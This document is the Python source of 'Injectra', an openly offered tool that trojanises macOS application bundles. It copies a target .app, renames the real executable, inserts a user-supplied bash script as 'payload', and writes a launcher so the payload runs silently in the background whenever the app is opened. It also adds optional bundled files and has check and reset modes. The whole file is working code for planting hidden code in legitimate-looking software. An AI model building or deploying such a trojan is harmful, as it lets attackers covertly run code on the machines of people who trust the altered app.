### Made by Taguar258 | Licence MIT ###

import sys
import subprocess
import os
from os import path
import argparse

# Colors
C_None = "\x1b[0;39m"
C_Blink = "\x1b[5;39m"
C_Bold = "\x1b[1;39m"
C_Red = "\x1b[31m"
C_Green = "\x1b[32m"
C_Yellow = "\x1b[33m"
C_Blue = "\x1b[34m"
#C_Cyan = "\x1b[36m"
#C_Magenta = "\x1b[35m"
C_BRed = "\x1b[1;31m"
C_BGreen = "\x1b[1;32m"
C_BYellow = "\x1b[1;33m"
C_BBlue = "\x1b[1;34m"
#C_BCyan = "\x1b[1;36m"
#C_BMagenta = "\x1b[1;35m"

#print(sys.argv)

if '-r' in sys.argv or '--reset' in sys.argv:
	parser = argparse.ArgumentParser()
	parser.add_argument('-r', '--reset', required=False, help='Remove the injection of an application', action='store_true')
	parser.add_argument('-a', '--app', type=str, nargs=1, required=True, help='OSX target application')
elif '-c' in sys.argv or '--check' in sys.argv:
	parser = argparse.ArgumentParser()
	parser.add_argument('-c', '--check', required=False, help='Check if application was injected by injectra', action='store_true')
	parser.add_argument('-a', '--app', type=str, nargs=1, required=True, help='OSX target application')
else:
	parser = argparse.ArgumentParser()
	parser.add_argument('-c', '--check', required=False, help='Check if application was injected by injectra', action='store_true')
	parser.add_argument('-r', '--reset', required=False, help='Remove the injection of an application', action='store_true')
	parser.add_argument('-a', '--app', type=str, nargs=1, required=True, help='OSX target application')
	parser.add_argument('-i', '--inject', type=str, nargs=1, required=True, help='Bash script to inject')
	parser.add_argument('-o', '--output', type=str, nargs=1, required=True, help='Output for the new application')
	parser.add_argument('-in', '--include', type=str, nargs=1, required=False, help='Inject other files into application')

def banner():
	bannertxt = """ 
---------------------------------------------------------------- 
@@@ @@@  @@@     @@@ @@@@@@@@  @@@@@@@ @@@@@@@ @@@@@@@   @@@@@@  
@@! @@!@!@@@     @@! @@!      !@@        @!!   @@!  @@@ @@!  @@@ 
!!@ @!@@!!@!     !!@ @!!!:!   !@!        @!!   @!@!!@!  @!@!@!@! 
!!: !!:  !!! .  .!!  !!:      :!!        !!:   !!: :!!  !!:  !!! 
:   ::    :  ::.::   : :: ::   :: :: :    :     :   : :  :   : : 
---------------------------------------------------------------- 
               Made by Taguar258 | MIT 2020                      
"""
	bannertxt = bannertxt.replace("@", C_BRed + "@")
	bannertxt = bannertxt.replace(":", C_BGreen + ":")
	bannertxt = bannertxt.replace("!", C_BYellow + "!")
	bannertxt = bannertxt.replace(".", C_BYellow + ".")
	bannertxt = bannertxt.replace(" ", C_None + " ")
	bannertxt = bannertxt.replace("-", C_Bold + "-")
	print(bannertxt)

def get_app_name(app, output):
	try:
		os.chdir(output + "/Contents/")
	except:
		print(C_BRed + "[!] Cannot access application." + C_None)
		quit()
	try:
		info = open("Info.plist", "r").read()
		info = info.split("<key>CFBundleExecutable</key>")[1]
		info = info.split("</string>")[0]
		info = info.split("<string>")[1]
		appname = info
	except:
		print(C_BRed + "[!] Cannot determin application name." + C_None)
		appname = input("[?] Enter original application name: ")
	return appname

banner()
args = parser.parse_args()
#print(args)
try:
	args.app[0] = path.abspath(args.app[0])
except:
	print(C_BRed + "[!] Cannot get full path of application." + C_None)
	quit()

try:
	if args.check:
		pass
except:
	args.check = False


if args.check:
	print("[i] Searching for application.")
	if path.isdir(args.app[0]):
		print("[+] Found application: %s" % args.app[0])
	else:
		print(C_BRed + "[!] Cannot find application." + C_None)
		quit()
	print("[i] Determin application name.")
	if args.app[0][-1:] == "/":
		appname = get_app_name(args.app[0][:len(args.app[0]) - 1], args.app[0])
	else:
		appname = get_app_name(args.app[0], args.app[0])
	print("[+] Application name sucessfully analyzed: %s" % appname)
	try:
		os.chdir("MacOS/")
	except:
		print(C_BRed + "[!] Cannot access applications main file." + C_None)
		quit()
	print("[i] Checking if application was injected by Injectra.")
	print("")
	if path.isfile(path.abspath(os.getcwd()) + "/" + "injectra"):
		print("[!] Injection was found.")
	else:
		print("[!] Application was not injected by injectra.")
		quit()
	quit()

try:
	if args.reset:
		pass
except:
	args.reset = False

if args.reset:
	print("[i] Searching for application.")
	if path.isdir(args.app[0]):
		print("[+] Found application: %s" % args.app[0])
	else:
		print(C_BRed + "[!] Cannot find application." + C_None)
		quit()
	print("[i] Determin application name.")
	if args.app[0][-1:] == "/":
		appname = get_app_name(args.app[0][:len(args.app[0]) - 1], args.app[0])
	else:
		appname = get_app_name(args.app[0], args.app[0])
	print("[+] Application name sucessfully analyzed: %s" % appname)
	try:
		os.chdir("MacOS/")
	except:
		print(C_BRed + "[!] Cannot access applications main file." + C_None)
		quit()
	print("[i] Checking if application was injected by Injectra.")
	if path.isfile(path.abspath(os.getcwd()) + "/" + "injectra"):
		print("[i] Injection was found.")
	else:
		print(C_BRed + "[!] Application was not injected by injectra." + C_None)
		quit()
	print("[i] Change start order.")
	try:
		print("[i] Please select yes.")
		subprocess.call(("rm -i '%s'" % appname), shell=True)
		subprocess.call(("rm -i 'payload'"), shell=True)
		if path.isfile(path.abspath(os.getcwd()) + "/" + appname):
			print(C_BRed + "[!] Cannot continue without your permission." + C_None)
			quit()
			raise Exception('No permission')
		subprocess.call(("mv 'injectra' '%s'" % appname), shell=True)
	except:
		print(C_BRed + "[!] Cannot remove injection." + C_None)
		quit()
	print("[+] Operation sucessful.")
	quit()

includer = False
try:
	args.inject[0] = path.abspath(args.inject[0])
	args.output[0] = path.abspath(args.output[0])
	try:
		if args.include[0] != "":
			args.include[0] = path.abspath(args.include[0])
			if args.include[0][-1:] == "/":
				args.include[0] = args.include[0][-1:]
			includer = True
	except:
		includer = False
except:
	print(C_BRed + "[!] Cannot get full path of files." + C_None)
	quit()


print("[i] Searching for application.")
if path.isdir(args.app[0]):
	print("[+] Found application: %s" % args.app[0])
else:
	print(C_BRed + "[!] Cannot find application." + C_None)
	quit()
#print("[i] Check if application is writable.")
#if os.access(args.app[0], os.W_OK):
#	print("[+] Application is writable.")
#else:
#	print(C_BRed + "[!] Cannot write application." + C_None)
#	quit()

print("[i] Searching for script.")
if path.isfile(args.inject[0]):
	print("[+] Found script: %s" % args.inject[0])
else:
	print(C_BRed + "[!] Cannot find script." + C_None)
	quit()
print("[i] Check if script is readable.")
if os.access(args.inject[0], os.R_OK):
	print("[+] Script is readable.")
else:
	print(C_BRed + "[!] Cannot read script." + C_None)
	quit()
print("[i] Check if output path is writable.")
try:
	output = args.output[0].split("/")
	output1 = ("/".join(output[:(len(output) - 1)]))
	output2 = ("." + ("/".join(output[-1:])))
	if output1 != "":
		output2 = "/" + output2
	output = (output1 + output2)
except:
	print(C_BRed + ("[!] Cannot get output path: %s" % output) + C_None)
	quit()
print("[i] Copying application...")

if path.isdir(output) or path.isdir(args.output[0]):
	print(C_BRed + ("[!] Output directory already exists: %s" % output) + C_None)
	quit()
try:
	subprocess.call(("cp -r '%s' '%s'" % (args.app[0], output)), shell=True)
	print("[+] Application sucessfully cloned.")
except:
	print(C_BRed + ("[!] Cannot write output: %s" % output) + C_None)
	quit()

print("[i] Injecting script...")
print("[i] Determin application name.")
if args.app[0][-1:] == "/":
	appname = get_app_name(args.app[0][:len(args.app[0]) - 1], output)
else:
	appname = get_app_name(args.app[0], output)
print("[+] Application name sucessfully analyzed: %s" % appname)
try:
	os.chdir("MacOS/")
except:
	print(C_BRed + "[!] Cannot access applications main file." + C_None)
	quit()
if includer:
	print("[i] Include files from folder...")
	if path.isdir(args.include[0]):
		print("[+] Get files: %s" % args.include[0])
	else:
		print(C_BRed + ("[!] Cannot find folder to include: %s" % args.include[0]) + C_None)
		quit()
	try:
		subprocess.call(("cp -a '%s/.' ." % args.include[0]), shell=True)
	except:
		print(C_BRed + "[!] Cannot include other files." + C_None)
		quit()
if includer:
	print("[i] Make included files executable...")
	try:
		subprocess.call(("chmod +x *"), shell=True)
	except:
		print(C_BRed + "[!] Cannot make other files executable." + C_None)
		quit()
print("[i] Change start order.")
try:
	subprocess.call(("cp '%s' payload" % args.inject[0]), shell=True)
except:
	print(C_BRed + "[!] Cannot insert injection." + C_None)
	quit()
try:
	subprocess.call(("mv '%s' 'injectra'" % appname), shell=True)
except:
	print(C_BRed + "[!] Cannot rearrange start order." + C_None)
	quit()
try:
	subprocess.call(('echo \'#!/bin/sh\nDIR=$(cd "$(dirname "$0")"; pwd) ; cd $DIR\n$DIR/payload &\n$DIR/injectra &\' > "%s"' % appname), shell=True)
except:
	print(C_BRed + "[!] Cannot write new start order." + C_None)
	quit()
try:
	subprocess.call(("chmod +x injectra ; chmod +x payload ; chmod +x '%s'" % appname), shell=True)
except:
	print(C_BRed + "[!] Cannot make injection executable." + C_None)
	quit()
try:
	os.chdir("../../../")
	subprocess.call(("mv '%s' '%s'" % (output, args.output[0])), shell=True)
except:
	print(C_BRed + "[!] Cannot make application visible." + C_None)
	quit()
print("[+] Injection sucessful.")


### Made by Taguar258 | Licence MIT ###
